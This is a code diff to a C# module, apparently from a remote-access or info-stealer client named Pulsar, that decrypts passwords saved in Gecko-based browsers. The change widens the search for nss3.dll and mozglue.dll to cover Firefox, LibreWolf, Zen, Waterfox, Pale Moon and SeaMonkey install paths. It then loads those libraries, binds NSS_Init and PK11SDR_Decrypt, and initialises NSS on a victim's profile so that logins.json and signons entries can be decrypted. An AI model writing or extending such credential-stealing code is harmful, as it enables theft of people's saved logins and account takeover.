@@ -40,41 +40,144 @@ namespace Pulsar.Client.Kematian.Browsers.Gecko.Passwords
         private IntPtr NSS3;
         private IntPtr Mozglue;
 
-        public long Init(string configDirectory)
+        private bool _initialized = false;
+        private string _profilePath = "";
+        private string _JSONData = "";
+        private string _sqlitePath = "";
+
+        public bool Init(string profilePath, string loginData = "", string signons = "")
         {
-            string mozillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\");
-
-            if (!Directory.Exists(mozillaPath))
+            try
             {
-                Debug.WriteLine("Mozilla Firefox not found.");
-                return -1;
+                _profilePath = profilePath;
+
+                if (!string.IsNullOrEmpty(loginData) && !File.Exists(loginData))
+                {
+                    Debug.WriteLine($"Error: logins.json not found at {loginData}");
+                    return false;
+                }
+
+                string[] possibleBrowserPaths = {
+                    // Firefox
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Mozilla Firefox\"),
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Mozilla Firefox\"),
+                    
+                    // LibreWolf
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"LibreWolf\"),
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"LibreWolf\"),
+                    
+                    // Zen
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Zen Browser\"),
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Zen Browser\"),
+                    
+                    // Waterfox
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Waterfox\"),
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Waterfox\"),
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Waterfox Classic\"),
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Waterfox Classic\"),
+                    
+                    // Pale Moon
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"Pale Moon\"),
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"Pale Moon\"),
+                    
+                    // Sea Monkey
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), @"SeaMonkey\"),
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), @"SeaMonkey\")
+                };
+                
+                bool libsFound = false;
+                string browserDir = "";
+                
+                foreach (var path in possibleBrowserPaths)
+                {
+                    if (Directory.Exists(path))
+                    {
+                        string nss = Path.Combine(path, "nss3.dll");
+                        string mozglue = Path.Combine(path, "mozglue.dll");
+                        
+                        if (File.Exists(nss) && File.Exists(mozglue))
+                        {
+                            libsFound = true;
+                            browserDir = path;
+                            break;
+                        }
+                    }
+                }
+                
+                if (!libsFound)
+                {
+                    string currentDir = profilePath;
+                    
+                    for (int i = 0; i < 5; i++)
+                    {
+                        string nss = Path.Combine(currentDir, "nss3.dll");
+                        string mozglue = Path.Combine(currentDir, "mozglue.dll");
+                        
+                        if (File.Exists(nss) && File.Exists(mozglue))
+                        {
+                            libsFound = true;
+                            browserDir = currentDir;
+                            break;
+                        }
+                        
+                        DirectoryInfo parentDir = Directory.GetParent(currentDir);
+                        if (parentDir == null) break;
+                        currentDir = parentDir.FullName;
+                    }
+                }
+                
+                if (libsFound)
+                {
+                    if (Path.GetDirectoryName(profilePath) != browserDir)
+                    {
+
+                    }
+                    
+                    try
+                    {
+                        NSS nss = new NSS();
+                        if (nss.Initialize(profilePath, browserDir))
+                        {
+                            NSS3 = nss.NSS3;
+                            Mozglue = nss.Mozglue;
+                            NSS_Init = nss.NSS_Init;
+                            PK11SDR_Decrypt = nss.PK11SDR_Decrypt;
+                            NSS_Shutdown = nss.NSS_Shutdown;
+                            
+                            _initialized = true;
+                            
+                            if (!string.IsNullOrEmpty(loginData))
+                            {
+                                _JSONData = loginData;
+                            }
+                            if (!string.IsNullOrEmpty(signons))
+                            {
+                                _sqlitePath = signons;
+                            }
+                            
+                            Debug.WriteLine("NSS initialized successfully");
+                            return true;
+                        }
+                        else
+                        {
+                            Debug.WriteLine("NSS initialization failed");
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error initializing NSS: {ex.Message}");
+                    }
+                }
+                else
+                {
+                    Debug.WriteLine("Failed to find NSS libraries in any location");
+                }
             }
-
-            string nssPath = Path.Combine(mozillaPath, "nss3.dll");
-            Mozglue = NativeMethods.LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
-            NSS3 = NativeMethods.LoadLibrary(nssPath);
-
-            if (NSS3 == IntPtr.Zero)
+            catch (Exception ex)
             {
-                Debug.WriteLine("Failed to load nss3.dll");
-                return -1;
+                Debug.WriteLine($"Error in PasswordsGecko Init: {ex.Message}");
             }
-
-            IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
-            IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
-            IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
-
-            if (initProc == IntPtr.Zero || shutdownProc == IntPtr.Zero || decryptProc == IntPtr.Zero)
-            {
-                Debug.WriteLine("Failed to get required function pointers from NSS3.");
-                return -1;
-            }
-
-            NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
-            PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
-            NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
-
-            return NSS_Init(configDirectory);
+            return false;
         }
 
         public string Decrypt(string cypherText)
@@ -177,8 +280,7 @@ namespace Pulsar.Client.Kematian.Browsers.Gecko.Passwords
                 return logins;
             }
 
-            // Initialize NSS only once
-            if (Init(profilePath) != 0)
+            if (!Init(profilePath))
             {
                 Debug.WriteLine("Failed to initialize NSS.");
                 return logins;
@@ -276,14 +378,14 @@ namespace Pulsar.Client.Kematian.Browsers.Gecko.Passwords
 
             [IgnoreDataMember]
             [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
-            public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }
+            public DismissedBAByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }
 
             [DataMember(Name = "version")]
             public long Version { get; set; }
         }
 
         [DataContract]
-        private class DismissedBreachAlertsByLoginGuid
+        private class DismissedBAByLoginGuid
         {
         }
 
@@ -357,6 +459,57 @@ namespace Pulsar.Client.Kematian.Browsers.Gecko.Passwords
                 catch (Exception ex)
                 {
                     Debug.WriteLine($"Error during disposal: {ex.Message}");
+                }
+            }
+        }
+        private class NSS
+        {
+            public IntPtr NSS3 { get; private set; }
+            public IntPtr Mozglue { get; private set; }
+            public NssInit NSS_Init { get; private set; }
+            public Pk11sdrDecrypt PK11SDR_Decrypt { get; private set; }
+            public NssShutdown NSS_Shutdown { get; private set; }
+            
+            public bool Initialize(string profilePath, string browserPath)
+            {
+                try
+                {
+                    string nss = Path.Combine(browserPath, "nss3.dll");
+                    string mozglue = Path.Combine(browserPath, "mozglue.dll");
+                    
+                    Mozglue = NativeMethods.LoadLibrary(mozglue);
+                    NSS3 = NativeMethods.LoadLibrary(nss);
+                    
+                    if (NSS3 == IntPtr.Zero || Mozglue == IntPtr.Zero)
+                    {
+                        return false;
+                    }
+                    
+                    IntPtr initProc = NativeMethods.GetProcAddress(NSS3, "NSS_Init");
+                    IntPtr shutdownProc = NativeMethods.GetProcAddress(NSS3, "NSS_Shutdown");
+                    IntPtr decryptProc = NativeMethods.GetProcAddress(NSS3, "PK11SDR_Decrypt");
+                    
+                    if (initProc == IntPtr.Zero || shutdownProc == IntPtr.Zero || decryptProc == IntPtr.Zero)
+                    {
+                        return false;
+                    }
+                    
+                    NSS_Init = (NssInit)Marshal.GetDelegateForFunctionPointer(initProc, typeof(NssInit));
+                    PK11SDR_Decrypt = (Pk11sdrDecrypt)Marshal.GetDelegateForFunctionPointer(decryptProc, typeof(Pk11sdrDecrypt));
+                    NSS_Shutdown = (NssShutdown)Marshal.GetDelegateForFunctionPointer(shutdownProc, typeof(NssShutdown));
+                    
+                    int result = (int)NSS_Init(profilePath);
+                    if (result != 0)
+                    {
+                        return false;
+                    }
+                    
+                    return true;
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error initializing NSS: {ex.Message}");
+                    return false;
                 }
             }
         }
